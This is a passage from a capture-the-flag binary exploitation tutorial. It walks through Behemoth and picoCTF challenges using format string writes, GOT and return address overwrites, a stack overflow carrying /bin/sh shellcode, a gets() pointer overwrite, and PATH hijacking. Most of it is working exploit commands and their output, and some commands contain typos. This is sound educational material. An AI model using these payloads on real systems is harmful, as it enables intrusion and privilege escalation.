$12 = (int (*)()) 0x8048731 &lt;goodfunction+18&gt;
gdb-peda$ x /10xb 0xffffd2fa
0xffffd2fa: 0x04    0x08    0x31    0x87    0x04    0x08    0xfc    0xd2
0xffffd302: 0xff    0xff
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>Let’s see another example Behemoth3 where we have only the assembly code of the program and we exploit this by two methods by overwriting the GOT address or overwriting the return address.</li>
</ul>
<blockquote>
<div><p>Assembly Source Code:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) disassemble main
Dump of assembler code for function main:
   0x0804847d &lt;+0&gt;: push   %ebp
   0x0804847e &lt;+1&gt;: mov    %esp,%ebp
   0x08048480 &lt;+3&gt;: and    $0xfffffff0,%esp
   0x08048483 &lt;+6&gt;: sub    $0xe0,%esp
   0x08048489 &lt;+12&gt;:    movl   $0x8048570,(%esp)
   0x08048490 &lt;+19&gt;:    call   0x8048330 &lt;printf@plt&gt;
   0x08048495 &lt;+24&gt;:    mov    0x80497a4,%eax
   0x0804849a &lt;+29&gt;:    mov    %eax,0x8(%esp)
   0x0804849e &lt;+33&gt;:    movl   $0xc8,0x4(%esp)
   0x080484a6 &lt;+41&gt;:    lea    0x18(%esp),%eax
   0x080484aa &lt;+45&gt;:    mov    %eax,(%esp)
   0x080484ad &lt;+48&gt;:    call   0x8048340 &lt;fgets@plt&gt;
   0x080484b2 &lt;+53&gt;:    movl   $0x8048584,(%esp)
   0x080484b9 &lt;+60&gt;:    call   0x8048330 &lt;printf@plt&gt;
   0x080484be &lt;+65&gt;:    lea    0x18(%esp),%eax
   0x080484c2 &lt;+69&gt;:    mov    %eax,(%esp)
   0x080484c5 &lt;+72&gt;:    call   0x8048330 &lt;printf@plt&gt;
   0x080484ca &lt;+77&gt;:    movl   $0x804858e,(%esp)
   0x080484d1 &lt;+84&gt;:    call   0x8048350 &lt;puts@plt&gt;
   0x080484d6 &lt;+89&gt;:    mov    $0x0,%eax
   0x080484db &lt;+94&gt;:    leave
   0x080484dc &lt;+95&gt;:    ret
End of assembler dump.
</pre></div>
</div>
<p>Observed Behavior:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>behemoth3@melinda:/tmp/rahul3$ ./behemoth3
Identify yourself: HelloCheck123
Welcome, HelloCheck123

aaaand goodbye again.
</pre></div>
</div>
<p>Well, we tried to provide a very large input to the Identify yourself, but it didn’t not gave a segmentation fault. Let’s try format string:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>behemoth3@melinda:/tmp/rahul3$ echo `python -c &#39;print &quot;A&quot;*4 + &quot;.%08x&quot;*7&#39;` | ./behemoth3
Identify yourself: Welcome, AAAA.000000c8.f7fcac20.00000000.00000000.f7ffd000.41414141.3830252e

aaaand goodbye again.
</pre></div>
</div>
<p>Trying simple format string provided us with the offset of our format string. Now we can write almost any address with any value with our input. Before that let’s put a environment variable shellcode and check it’s address:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>export EGG=`python -c &#39;print &quot;\x90&quot;*90 + &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;&#39;`
</pre></div>
</div>
<p>Let’s core dump the binary using %s and examine the core. Our shellcode can be reached at 0xffffd8f0</p>
<ul class="simple">
<li>Either we can overwrite the return address (main+95): Let’s debug the program set the breakpoint at main+95 and see the value of $esp which would be use to find the return address when binary is executed without gdb. The valueis 0xf7e3ba63 and the return address which needed to be overwrriten is 0xffffd65c. Let’s again core dump the binary to see the return address without gdb.</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) find $esp,+2000,0xf7e3ba63
0xffffd66c
1 pattern found.
</pre></div>
</div>
<p>So, if we overwrite the return address at 0xffffd66c with our shellcode value of 0xffffd8f0, we should get a shell.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>python -c &#39;print &quot;\x5e\xd6\xff\xff\x5c\xd6\xff\xff&quot; +&quot;%.65527x%6$hn %.55503x%7$hn&quot;&#39; &gt; input98
</pre></div>
</div>
<p>This is little tricky because we might have to guess the return address without gdb. Previously it was coming 0xffffd66c but we got shell using 0xffffd65c.</p>
</div></blockquote>
<ul class="simple">
<li>overwrite the puts GOT address: Find the GOT address of puts which is 0x08049790 and overwrite it with</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>python -c &#39;print &quot;\x92\x97\x04\x08\x90\x97\x04\x08&quot; +&quot;%.65527x%6$hn %.55503x%7$hn&quot;&#39;
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
<ul class="simple">
<li>In the below code, if we can somehow set the value of secret to 1337, we can get a shell on the system to read the flag. Also, the printf function directly prints the argument whatever is passed by the user. By concepts above, we need to find the address of secret and write to it. Address of the secret can be found by gdb or objdump. Either the address would be already present on stack or it can be put on stack.</li>
</ul>
<blockquote>
<div><div class="code c highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;

int secret = 0;

void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system(&quot;/bin/sh -i&quot;);
}

int main(int argc, char **argv){
    int *ptr = &amp;secret;
    printf(argv[1]);

    if (secret == 1337){
        give_shell();
    }
    return 0;
}
</pre></div>
</div>
<p>Reading the address</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>pico83515@shell:/home/format$ gdb -q format
Reading symbols from format...(no debugging symbols found)...done.
(gdb) p $secret
$1 = void
(gdb) p &amp;secret
$2 = (&lt;data variable, no debug info&gt; *) 0x804a030 &lt;secret&gt;
</pre></div>
</div>
<p>Now we have to find whether is this address present on the stack? If not, we can put this address on the stack because of the format string vulnerability.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>pico83515@shell:/home/format$ ./format %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
ffffd774.ffffd780.f7e4f39d.f7fc83c4.f7ffd000.0804852b.0804a030.08048520.00000000
</pre></div>
</div>
<p>We see that the address is present on the stack at the seventh position. Otherwise, we can put it on the stack by</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>for i in {1..256};do echo -n &quot;Offset: $i:&quot;; env -i ./format AAAA%$i\$x;echo ;done | grep 4141
</pre></div>
</div>
<p>What this is doing is “Extracting particular stack content by “%$i$x”. As we have seen in DMA, $x can be used to extract particular stack content and reading it. $i value changes from 1-256. However, as you add more data, the offset of your original input changes, so go ahead and add 1333 more bytes of data and see what the offset is then. (1337 is what we want to put into secret, and we will have written four bytes (AAAA), so 1333+4 = 1337)</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>or i in {1..256};do echo -n &quot;Offset: $i:&quot;; env -i ./format AAAA%$i\$x%1333u;echo ;done | grep 4141
Offset: 103:AAAA41410074
Offset: 104:AAAA31254141
</pre></div>
</div>
<p>So we found our A’s again, but they aren’t aligned on the stack. Lets add two more A’s at the end to see if we can get it to line up.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>for i in {1..256};do echo -n &quot;Offset: $i:&quot;; env -i ./format AAAA%$i\$x%1333uAA;echo ;done | grep 41414141
Offset: 103:AAAA41414141
</pre></div>
</div>
<p>It looks like the address 0x0804a030 is getting placed in *ptr. That’s the address we need to use in place of our A’s. In order to place the number 1337 into secret’s memory address, we need to use the %n modifier. (%103$n will look at the data located at offset 103 as a memory address, and write the total number of bytes we have written so far into that address.)</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>pico1139@shell:/home/format$: env -i ./format $:`(python -c &#39;print &quot;\x30\xa0\x04\x08&quot;+&quot;%1333u%103`\ nAA&quot;&#39;)
$ id
uid=11066(pico1139) gid=1008(format) groups=1017(picogroup) $ ls
Makefile flag.txt format format.c $ cat flag.txt
who\_thought\_%n\_was\_a\_good\_idea?
</pre></div>
</div>
<p>Otherwise as the address at the seventh is already present on stack we can also do</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>plain pico83515@shell:/home/format$ ./format &quot;%1337u%7$n&quot;
</pre></div>
</div>
<p>We used DMA to access the memory, so written 1337 directly at the address pointed by the 7th position. Otherwise, we can use the basic</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>./format %08x.%08x.%08x.%08x.%08x.%1292u%n
</pre></div>
</div>
<p>If you see, we did 5 stack pop-up by using %08x, written the value to be written at 6th position and 7th position contains the address of secret. If you further see “%08x.” is of eight characters + 1 of “.” or 9 bytes, used five times i.e 9*5=45 bytes and 1292+45 == 1337.</p>
</div></blockquote>
<ul class="simple">
<li>In another example below,</li>
</ul>
<blockquote>
<div><div class="code c highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

#define BUFSIZE 256

void greet(int length){
    char buf[BUFSIZE];
    puts(&quot;What is your name?&quot;);
    read(0, buf, length);
    printf(&quot;Hello, %s\n!&quot;, buf);
}

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv){
    int length;
    be_nice_to_people();

    puts(&quot;How long is your name?&quot;);
    scanf(&quot;%d&quot;, &amp;length);

    if(length &lt; BUFSIZE) //don&#39;t allow buffer overflow
        greet(length);
    else
        puts(&quot;Length was too long!&quot;);
}
</pre></div>
</div>
<p>This program tries to prevent buffer overflows by first asking for the input length. It disregards the rest of the ouput. However, the program uses scanf. If we supply -1 as the length, we can bypass the overflow check: readelf -l no_overflow can be used to find if there’s any protection on the binary. Stack is executable, Furthermore, ASLR is not enabled. This makes it easy to stick in a shellcode plus a NOP sled and return to an address on the stack</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>pico1139@shell:/home/no_overflow$ (echo -1; python -c &#39;print &quot;A&quot;*268+&quot;\xd0\xd6\xff\xff&quot;+&quot;\x90&quot;*200+&quot; &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;&#39;; cat) | ./no_overflow
How long is your name?
What is your name?
Hello, AAAAAAAAAAAAAAAAAAAAAA...snip...

id
uid=11066(pico1139) gid=1007(no_overflow) groups=1017(picogroup)
cat flag.txt
what_is_your_sign
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>In an another example where stack is not executable, If you read the code, you would find, we need to change the file_name from not_the_flag.txt to flag.txt. In this example, they provided the address of the string “not_the_flag.txt” as 0x08048777. By putting a break point in puts in gdb and looking for the address of flag.txt.</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) br *puts
Breakpoint 1 at 0x8048460
(gdb) run
Starting program: /home/what_the_flag/what_the_flag

Breakpoint 1, 0xf7e81ee0 in puts () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/s 0x08048777
0x8048777:  &quot;not_the_flag.txt&quot;
(gdb) x/s 0x08048778
0x8048778:  &quot;ot_the_flag.txt&quot;
(gdb) x/s 0x08048770
0x8048770:  &quot;le: %s&quot;
(gdb) x/s 0x0804877C
0x804877c:  &quot;he_flag.txt&quot;
(gdb) x/s 0x0804877D
0x804877d:  &quot;e_flag.txt&quot;
(gdb) x/s 0x0804877E
0x804877e:  &quot;_flag.txt&quot;
(gdb) x/s 0x0804877F
0x804877f:  &quot;flag.txt&quot;
</pre></div>
</div>
<div class="code c highlight-None notranslate"><div class="highlight"><pre><span></span>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

struct message_data{
    char message[128];
    char password[16];
    char *file_name;
};

void read_file(char *buf, char *file_path, size_t len){
    FILE *file;
    if(file= fopen(file_path, &quot;r&quot;)){
        fgets(buf, len, file);
        fclose(file);
    }else{
        sprintf(buf, &quot;Cannot read file: %s&quot;, file_path);
    }
}

int main(int argc, char **argv){
    struct message_data data;
    data.file_name = &quot;not_the_flag.txt&quot;;

    puts(&quot;Enter your password too see the message:&quot;);
    gets(data.password);

    if(!strcmp(data.password, &quot;1337_P455W0RD&quot;)){
        read_file(data.message, data.file_name, sizeof(data.message));
        puts(data.message);
    }else{
        puts(&quot;Incorrect password!&quot;);
    }

    return 0;
}
</pre></div>
</div>
<p>So we’ll ovewrite the file pointer with 0x804877f to make it read flag.txt. From gets()’s manual: gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (‘\0’). No check for buffer overrun is performed (see BUGS below). So by using the following input, we can overwrite the file pointer and still provide the correct password:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>1337_P455W0RD
1337_P455W0RD\0aa\x7f\x87\x04\x08
aa\x7f\x87\x04\x08
</pre></div>
</div>
<p>We use this in the command line to get the flag</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>pico83515@shell:/home/what_the_flag$ printf &quot;1337_P455W0RD\0bb\x7f\x87\x04\x08&quot; | ./what_the_flag
Enter your password too see the message:
Congratulations! Here is the flag: who_needs_%eip

pico83515@shell:/home/what_the_flag$
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="miscellanous-examples">
<h2>Miscellanous Examples<a class="headerlink" href="#miscellanous-examples" title="Permalink to this headline">¶</a></h2>
<p>Let’s see some miscellanous examples away from Buffer/Format Vulnerabilities.</p>
<ul class="simple">
<li>So, we have a binary which when executed gives</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>behemoth2@melinda:/behemoth$ ./behemoth2
touch: cannot touch &#39;13373&#39;: Permission denied
</pre></div>
</div>
<p>Let’s see what ltrace provides us</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>behemoth2@melinda:/behemoth$ ltrace ./behemoth2
__libc_start_main(0x804856d, 1, 0xffffd794, 0x8048640 &lt;unfinished ...&gt;
getpid()                                                                                                               = 14118
sprintf(&quot;touch 14118&quot;, &quot;touch %d&quot;, 14118)                                                                              = 11
__lxstat(3, &quot;14118&quot;, 0xffffd688)                                                                                       = -1
unlink(&quot;14118&quot;)                                                                                                        = -1
system(&quot;touch 14118&quot;touch: cannot touch &#39;14118&#39;: Permission denied
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                                                                                 = 256
sleep(2000
</pre></div>
</div>
<p>Let’s see a truncated output of disassemble main, if we see getpid gets the binary pid, sprintf something in some buffer, lstat provides thefile status, unlink -call the unlink function to remove the specified file.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) disassemble main
Dump of assembler code for function main:
   0x08048588 &lt;+27&gt;:    call   0x8048410 &lt;getpid@plt&gt;
   0x080485b3 &lt;+70&gt;:    call   0x8048450 &lt;sprintf@plt&gt;
   0x080485c7 &lt;+90&gt;:    call   0x80486c0 &lt;lstat&gt;
   0x080485df &lt;+114&gt;:   call   0x8048400 &lt;unlink@plt&gt;
   0x080485eb &lt;+126&gt;:   call   0x8048420 &lt;system@plt&gt;
   0x080485f7 &lt;+138&gt;:   call   0x80483e0 &lt;sleep@plt&gt;
   0x08048616 &lt;+169&gt;:   call   0x8048420 &lt;system@plt&gt;
   0x08048635 &lt;+200&gt;:   leave
   0x08048636 &lt;+201&gt;:   ret
</pre></div>
</div>
<p>If you check the ltrace output</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>system(&quot;touch 14118&quot;touch: cannot touch &#39;14118&#39;: Permission denied
</pre></div>
</div>
<p>touch is being called without an absolute path, so we can take advantage of that. First we’ll create our own touch script that prints out the contents /etc/behemoth_pass/behemoth3. Next, the PATH variable needs to be updated so that it looks at the current working directory first to ensure that our touch script is executed and not the actual touch program. PATH=/tmp:$PATH, you set /tmp to your primary location to search for binaries and the like… so if you create a file in /tmp/ called touch, it’ll actually execute that instead of /usr/bin/touch</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>behemoth2@melinda:/tmp/rahul2$ cat touch
cat /etc/behemoth_pass/behemoth3
behemoth2@melinda:/tmp/rahul2$ history | grep PATH
19  history | grep PATH
behemoth2@melinda:/tmp/rahul2$ PATH=/tmp/rahul2:$PATH /behemoth/behemoth2
**********
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="changelog">
<h2>Changelog<a class="headerlink" href="#changelog" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
</ul>
<div data-disqus-identifier="CTF Series :  Binary Exploitation" data-disqus-shortname="techbitvijays" id="disqus_thread"></div></div>
</div>


          </div>
        </div>
      </div>
      <div class="clearer"></div>
    </div>
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
      </ul>
    </div>
    <div class="footer" role="contentinfo">
        &#169; Copyright 2017, Vijay Kumar.
    </div>
  </body>
</html>